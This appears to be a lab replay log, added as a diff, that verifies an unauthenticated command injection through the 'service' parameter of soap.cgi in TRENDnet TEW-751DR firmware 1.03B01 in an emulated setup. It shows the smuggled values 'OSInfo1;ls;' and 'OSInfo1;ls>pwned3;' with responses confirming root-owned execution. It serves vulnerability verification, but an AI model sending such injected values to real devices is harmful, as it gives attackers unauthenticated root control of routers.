@@ -1,0 +1,51 @@
+[i] 起 phpserver 替身：<rootfs>/rootfs/var/run/xmldb_sock（只 listen + 回空 200，真机 phpserver 未被验证）
+=== C-1  soap.cgi service= -> system() (unauthenticated) ===
+target : TRENDnet TEW-751DR 1.03B01
+image  : TEW-751DRv1_(FW1.03B01).zip
+sha256 : fe1168fc2b2bf4744df3a7145eeaf11b2c5272ae502c8f2993e5c614499322ec
+cgibin : e27547940d0ae75233fc6b2b64c50d37fc3b55d4dea9d86bbb86dd448f08a7eb
+host   : lab-host  2026-10-30T23:31:49+08:00
+single variable: the 'service' query value
+
+########## CONTROL   service=OSInfo1 ##########
+    HTTP/1.1 200 OK
+    Server: BaseHTTP/0.6 Python/3.12.3
+    Date: Fri, 30 Oct 2026 15:31:49 GMT
+    Content-Type: text/xml; charset=utf-8
+    Content-Length: 0
+    X-CGI-Exit: 0
+    
+    -> pwned3 exists? no
+
+########## TRIGGER   service=OSInfo1;ls;  (command output on the CGI stdout) ##########
+    HTTP/1.1 200 OK
+    Server: BaseHTTP/0.6 Python/3.12.3
+    Date: Fri, 30 Oct 2026 15:31:49 GMT
+    Content-Type: text/xml; charset=utf-8
+    Content-Length: 126
+    X-CGI-Exit: 0
+    
+    tmp
+    home
+    var
+    sbin
+    dev
+    lib
+    htdocs
+
+########## TRIGGER   service=OSInfo1;ls>pwned3;  (file side effect) ##########
+    HTTP/1.1 200 OK
+    Server: BaseHTTP/0.6 Python/3.12.3
+    Date: Fri, 30 Oct 2026 15:31:49 GMT
+    Content-Type: text/xml; charset=utf-8
+    Content-Length: 0
+    X-CGI-Exit: 0
+    
+    -> pwned3 exists? yes
+    -> pwned3 owner/mode: root:root 644  size 94 bytes
+
+[note] the command output and 'ls>' both ran; the listing appears before the CGI
+       status line because the child writes to fd 1 while the CGI's own header
+       sits in a buffered stream. A strict HTTP server may therefore not relay
+       the output to the client -- the file side effect is the reliable proof.
+[replay done] control and trigger differ only in the service value
